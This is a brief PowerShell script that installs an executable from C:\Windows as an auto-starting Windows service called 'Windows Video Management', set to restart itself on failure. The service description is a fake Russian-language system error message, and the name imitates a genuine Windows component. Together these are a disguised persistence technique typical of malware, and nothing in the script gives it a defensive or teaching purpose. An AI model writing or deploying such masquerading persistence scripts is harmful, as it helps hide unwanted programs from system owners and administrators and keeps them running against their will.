$serviceName = "winvidmgmt64";
$servicePath = "C:\Windows\" + $serviceName + "\" + $serviceName + ".exe";
$serviceDisplayName = "Windows Video Management";
$serviceDescription = "<Не удается прочитать описание. Код ошибки: 15100>";

chcp 65001
sc.exe create $serviceName binpath=$servicePath DisplayName= $serviceDisplayName
sc.exe description $serviceName $serviceDescription
sc.exe failure $serviceName reset=0 actions=restart/60000/restart/60000/run/1000
Set-Service $serviceName –startuptype automatic
sc.exe start $serviceName